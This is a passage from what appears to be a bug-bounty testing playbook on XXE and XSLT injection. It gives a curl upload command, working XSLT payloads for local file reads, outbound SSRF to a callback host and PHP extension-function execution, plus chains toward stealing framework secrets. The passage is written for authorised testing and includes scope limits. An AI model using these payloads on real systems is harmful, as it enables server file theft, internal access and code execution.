  curl -sS "${HDR[@]}" $A -F "stylesheet=@xxe010.xsl;type=application/xml" "$T/api/reports/transform" -o "$E/evidence/$H/XXE-010/fingerprint.body"
  ```
  Then one read, chosen by vendor, placed inside the template:
  ```xml
  <xsl:copy-of select="document('/etc/xml/catalog')"/>                <!-- any processor: well-formed XML files only -->
  <xsl:value-of select="unparsed-text('file:///etc/hostname')"/>      <!-- XSLT 2.0 and later (Saxon) -->
  <xsl:copy-of select="document('http://xxe010.OOB/x')"/>             <!-- outbound request: SSRF with the response in the output -->
  <xsl:value-of select="php:function('php_uname','n')" xmlns:php="http://php.net/xsl"/>   <!-- libxslt with registerPHPFunctions -->
  ```
- **Proof:** the transform output containing the vendor string and the file content or the internal response. For
  an extension function, the output of one call that only returns a value (host name, version). Do not write
  files, start processes or load remote stylesheets that do more.
- **Not a finding when:** the stylesheet is applied in the browser (the response is the XML with a stylesheet link
  and your browser did the work), or the processor runs with secure processing: `document()` returns an empty
  node set, extension functions raise "not allowed", and no callback arrives.
- **Escalate:** `document()` to internal URLs is full-read SSRF: SSR-003. Confirmed extension-function execution is
  code execution on the server: report it with the single harmless call and stop; RCE chapter for the write-up
  conventions.

## Graveyard

- **Entity-expansion denial of service** (billion laughs, quadratic blow-up, external entity pointing at
  `/dev/random`). It takes the parser down, which is the test. Excluded on almost every programme (`dos`) and not
  to be sent here. The index holds a few paid ones (#754117); they are the exception.
- **DNS-only or DTD-fetch-only callbacks** reported as XXE. Triagers call it "external service interaction" and
  close it informative unless a file or an internal response is shown.
- **"The API also accepts XML"** with no entity resolution. Informative.
- **`xmlrpc.php` is enabled** on WordPress: pingback and brute-force amplification reports of the #2299069 kind
  are closed N/A or duplicate (`rate-limit`, `dos`).
- **SVG stored and served unchanged.** No server-side parser was involved. If script runs it belongs to the XSS
  and UPL chapters.
- **XXE in a third-party viewer, converter or identity provider** that the file or assertion was handed to
  (`third-party`).
- **Known-CVE XXE in an identified product** inside the programme's patch window, or reported from a version
  banner without a working read (`known-cve`).
- **A parser in the client.** A mobile or desktop app that parses your XML is not a server finding.

## Chains

- XXE-001, XXE-003 or XXE-010 with an `http://` identifier → SSR-003: full-read SSRF to cloud metadata and
  loopback services.
- XXE file read → DSR-005, DSR-009, DSR-011: `web.config` machineKey, Laravel `APP_KEY`, Rails `secret_key_base`
  turn a read into forged state and code execution. Describe the chain; pull the secret only if the policy allows.
- XXE-002 → every injection chapter: the XML reader bypasses JSON-only validation and WAF rules.
- UPL (upload restrictions bypassed) → XXE-007 and XXE-008: getting an SVG or office file past the filter.
- XXE-007 and XXE-008 → SSR-008: the same file formats as fetch triggers.
- XXE-009 → OAU: the SAML endpoint is pre-authentication surface; the signature attacks live there.
- XXE with a `phar://` identifier on PHP before 8.0 → DSR-008: the entity fetch triggers metadata deserialization.

## Sources

- `kb/reports/xxe.md` and `kb/reports/all/xxe.md`: the disclosed reports this chapter is built from.
- HexBrain: `get_testing_playbook {"topic":"XXE"}`, `find_bypasses {"protection":"xxe filter"}`, `find_payloads {"topic":"XXE Injection"}`.
- PortSwigger Web Security Academy, XML external entity (XXE) injection; OWASP WSTG-INPV-07; OWASP XXE Prevention
  Cheat Sheet (the per-parser defaults); PayloadsAllTheThings, XXE Injection.
- Arseniy Sharoglazov, "Exploiting XXE with local DTD files" (2018); GoSecure `dtd-finder` for DTD paths inside
  jars and packages.
- Timothy Morgan, "XML Schema, DTD, and Entity Attacks" (2014).
